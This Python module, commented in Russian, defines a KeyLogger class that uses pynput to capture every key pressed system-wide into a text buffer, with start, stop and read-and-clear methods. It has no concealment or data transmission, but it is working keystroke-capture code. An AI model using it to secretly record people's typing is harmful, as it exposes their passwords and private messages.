import threading
import time
from collections import deque
from typing import Optional

from pynput import keyboard


class KeyLogger:
    def __init__(self):
        self.is_active = False
        self.buffer = deque(maxlen=10000)  # ограничиваем размер буфера
        self.listener: Optional[keyboard.Listener] = None
        self.lock = threading.Lock()

    def start_logging(self):
        """Запуск кейлоггера."""
        with self.lock:
            if self.is_active:
                return
            self.is_active = True
            self.buffer.clear()
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()

    def stop_logging(self):
        """Остановка кейлоггера."""
        with self.lock:
            if not self.is_active:
                return
            self.is_active = False
            if self.listener:
                self.listener.stop()
                self.listener = None

    def _on_key_press(self, key):
        """Обработка нажатия клавиши."""
        if not self.is_active:
            return
        
        try:
            # Преобразуем клавишу в читаемый текст
            if hasattr(key, 'char') and key.char is not None:
                # Обычные символы
                self.buffer.append(key.char)
            elif key == keyboard.Key.space:
                self.buffer.append(' ')
            elif key == keyboard.Key.enter:
                self.buffer.append('\n')
            elif key == keyboard.Key.tab:
                self.buffer.append('\t')
            elif key == keyboard.Key.backspace:
                # Удаляем последний символ из буфера
                if self.buffer:
                    self.buffer.pop()
            else:
                # Специальные клавиши
                key_name = str(key).replace('Key.', '')
                self.buffer.append(f'[{key_name}]')
        except Exception:
            # Игнорируем ошибки для стабильности
            pass

    def get_accumulated_text(self) -> str:
        """Получить накопленный текст и очистить буфер."""
        with self.lock:
            if not self.buffer:
                return ""
            text = ''.join(self.buffer)
            self.buffer.clear()
            return text

    def is_running(self) -> bool:
        """Проверить, активен ли кейлоггер."""
        with self.lock:
            return self.is_active


# Глобальный экземпляр кейлоггера
keylogger = KeyLogger()
